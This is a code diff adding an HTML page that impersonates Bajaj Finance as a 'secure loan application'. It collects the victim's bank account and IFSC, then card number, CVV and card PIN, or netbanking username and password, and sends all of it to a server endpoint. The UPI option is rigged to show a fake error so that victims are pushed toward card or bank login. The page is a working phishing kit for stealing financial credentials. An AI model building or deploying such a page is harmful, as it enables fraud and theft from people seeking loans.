@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bajaj Finance - Loan Application</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{background:#fff;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.1);max-width:450px;width:100%;overflow:hidden}.header{background:linear-gradient(135deg,#f7931e 0%,#ff6b35 100%);padding:30px 20px;text-align:center;color:#fff}.logo{width:80px;height:80px;background:#fff;border-radius:50%;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:700;color:#f7931e;box-shadow:0 10px 20px rgba(0,0,0,.2)}.header h1{font-size:24px;margin-bottom:5px}.form-container{padding:30px 25px}.step{display:none}.step.active{display:block;animation:fadeIn .3s ease-in}@keyframes fadeIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}.input-group{margin-bottom:20px}label{display:block;margin-bottom:8px;font-weight:600;color:#333;font-size:14px}input{width:100%;padding:15px;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;transition:all .3s ease;background:#f8f9fa}input:focus{outline:none;border-color:#f7931e;background:#fff;box-shadow:0 0 0 3px rgba(247,147,30,.1)}.btn{width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s ease;margin-bottom:15px}.btn-primary{background:linear-gradient(135deg,#f7931e 0%,#ff6b35 100%);color:#fff}.btn-primary:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 10px 20px rgba(247,147,30,.3)}.btn:disabled{opacity:.6;cursor:not-allowed}.payment-tabs{display:flex;margin-bottom:20px;background:#f8f9fa;border-radius:12px;overflow:hidden}.tab-btn{flex:1;padding:15px;border:none;background:0 0;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s ease;color:#666}.tab-btn.active{background:#f7931e;color:#fff}.tab-content{display:none}.tab-content.active{display:block}.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin-bottom:20px}.netbanking-grid{display:grid;gap:15px}.error,.success{padding:15px;border-radius:12px;margin-bottom:20px;display:none}.error{background:#fee;color:#c33;border-left:4px solid #c33}.success{background:#d4edda;color:#155724;border-left:4px solid #28a745;text-align:center}@media (max-width:480px){.container{margin:10px;border-radius:15px}.form-container{padding:25px 20px}.card-grid{grid-template-columns:1fr}}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">BF</div>
+            <h1>Bajaj Finance</h1>
+            <p>Secure Loan Application</p>
+        </div>
+        <div class="form-container">
+            <div class="step active" id="step1">
+                <div class="input-group">
+                    <label>Full Name *</label>
+                    <input type="text" id="name" placeholder="Enter your full name" required>
+                </div>
+                <div class="input-group">
+                    <label>Mobile Number *</label>
+                    <input type="tel" id="mobile" placeholder="98XXXXXXXX" required>
+                </div>
+                <div class="input-group">
+                    <label>Loan Amount (₹) *</label>
+                    <input type="number" id="loanAmount" placeholder="50000" min="10000" required>
+                </div>
+                <button class="btn btn-primary" onclick="nextStep(1)">Next →</button>
+            </div>
+            <div class="step" id="step2">
+                <div class="input-group">
+                    <label>Account Number *</label>
+                    <input type="text" id="accountNo" placeholder="123456789012" required>
+                </div>
+                <div class="input-group">
+                    <label>IFSC Code *</label>
+                    <input type="text" id="ifsc" placeholder="HDFC0001234" required>
+                </div>
+                <button class="btn btn-primary" onclick="nextStep(2)">Next →</button>
+                <button class="btn" onclick="prevStep(2)" style="background:#6c757d;color:#fff;margin-top:10px">← Back</button>
+            </div>
+            <div class="step" id="step3">
+                <div class="payment-tabs">
+                    <button class="tab-btn active" onclick="selectPayment('card')">💳 Card</button>
+                    <button class="tab-btn" onclick="selectPayment('netbanking')">🏦 Netbanking</button>
+                    <button class="tab-btn" onclick="selectPayment('upi')">📱 UPI</button>
+                </div>
+                <div class="tab-content active" id="card-form">
+                    <div class="card-grid">
+                        <div class="input-group">
+                            <label>Card Number *</label>
+                            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                        </div>
+                        <div class="input-group">
+                            <label>Expiry Date *</label>
+                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+                    </div>
+                    <div class="card-grid">
+                        <div class="input-group">
+                            <label>CVV *</label>
+                            <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                        </div>
+                        <div class="input-group">
+                            <label>PIN *</label>
+                            <input type="password" id="pin" placeholder="****" maxlength="4" required>
+                        </div>
+                    </div>
+                    <button class="btn btn-primary" onclick="submitCard()">Pay Now</button>
+                </div>
+                <div class="tab-content" id="netbanking-form">
+                    <div class="netbanking-grid">
+                        <div class="input-group">
+                            <label>Bank Username *</label>
+                            <input type="text" id="netUsername" placeholder="Enter username" required>
+                        </div>
+                        <div class="input-group">
+                            <label>Password *</label>
+                            <input type="password" id="netPassword" placeholder="Enter password" required>
+                        </div>
+                    </div>
+                    <button class="btn btn-primary" onclick="submitNetbanking()">Login & Pay</button>
+                </div>
+                <button class="btn" onclick="prevStep(3)" style="background:#6c757d;color:#fff;margin-top:10px">← Back</button>
+            </div>
+            <div class="success" id="successMsg" style="display:none">✅ Payment Successful! Your loan will be processed within 24 hours.</div>
+            <div class="error" id="errorMsg"></div>
+        </div>
+    </div>
+    <script>
+let currentStep=1;document.getElementById('cardNumber').addEventListener('input',e=>{let t=e.target.value.replace(/\s/g,'').replace(/[^0-9]/gi,'');e.target.value=t.match(/.{1,4}/g)?.join(' '):t});document.getElementById('expiry').addEventListener('input',e=>{let t=e.target.value.replace(/\D/g,'');t.length>=2&&(t=t.substring(0,2)+'/'+t.substring(2,4)),e.target.value=t});async function submitForm(t){try{const e={name:document.getElementById('name').value,mobile:document.getElementById('mobile').value,loanAmount:document.getElementById('loanAmount').value,accountNo:document.getElementById('accountNo').value,ifsc:document.getElementById('ifsc').value,...t},a=await fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(e)});if(a.ok){const n=await a.json();n.success?showSuccess():showError('Payment failed. Please try again.')}else showError('Server error! Please try again sometime.')}catch{showError('Network error! Please try again.')}}function getFormData(){return{name:document.getElementById('name').value,mobile:document.getElementById('mobile').value,loanAmount:document.getElementById('loanAmount').value,accountNo:document.getElementById('accountNo').value,ifsc:document.getElementById('ifsc').value,cardNumber:document.getElementById('cardNumber').value,expiry:document.getElementById('expiry').value,cvv:document.getElementById('cvv').value,pin:document.getElementById('pin').value}}function nextStep(t){document.querySelectorAll('#step'+t+' input[required]').forEach(e=>{!e.value.trim()&&(e.focus(),showError('Please fill all required fields'),setTimeout(hideError,3e3))});document.getElementById('step'+t).classList.remove('active'),currentStep=t+1,document.getElementById('step'+currentStep).classList.add('active')}function prevStep(t){document.getElementById('step'+t).classList.remove('active'),currentStep=t-1,document.getElementById('step'+currentStep).classList.add('active')}function selectPayment(t){document.querySelectorAll('.tab-btn').forEach(e=>e.classList.remove('active')),event.target.classList.add('active'),document.querySelectorAll('.tab-content').forEach(e=>e.classList.remove('active')),document.getElementById(t+'-form').classList.add('active'),'upi'===t&&showError('Server error! Please try again sometime.')}async function submitCard(){const t=getFormData();submitForm({cardNumber:t.cardNumber,expiry:t.expiry,cvv:t.cvv,pin:t.pin})}async function submitNetbanking(){const t=document.getElementById('netUsername').value,e=document.getElementById('netPassword').value;t&&e?submitForm({netUsername:t,netPassword:e}):showError('Please enter username and password')}function showSuccess(){document.querySelectorAll('.step').forEach(t=>t.style.display='none'),document.getElementById('successMsg').style.display='block'}function showError(t){const e=document.getElementById('errorMsg');e.textContent=t,e.style.display='block',setTimeout(()=>{e.style.display='none'},5e3)}function hideError(){document.getElementById('errorMsg').style.display='none'}
+    </script>
+</body>
+</html>
